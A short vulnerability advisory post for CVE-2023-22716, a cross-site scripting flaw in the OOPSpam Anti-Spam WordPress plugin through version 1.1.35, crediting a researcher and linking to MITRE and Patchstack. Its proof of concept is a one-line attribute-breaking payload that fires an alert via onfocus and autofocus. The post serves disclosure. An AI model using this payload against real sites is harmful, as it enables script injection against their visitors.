---
layout: post
title: CVE-2023-22716 - OOPSpam Anti-Spam Plugin <= 1.1.35 - Cross Site Scripting (XSS)
---

Description
============
OOPSpam Anti-Spam Plugin <= 1.1.35 This could allow a malicious actor to inject malicious scripts, such as redirects, advertisements, and other HTML payloads into your website which will be executed when guests visit your site.

Proof Of Concept
============
Payload

~~~
" onfocus=alert(/XSS/) autofocus="
~~~

References
============ 
-[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22716](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22716)
-[Patchstack](https://patchstack.com/database/vulnerability/oopspam-anti-spam/wordpress-oopspam-anti-spam-plugin-1-1-35-cross-site-scripting-xss-vulnerability)



[Rio Darmawan](https://patchstack.com/database/researcher/0f0ce3de-fbab-4348-9729-a5ef92c74b3e)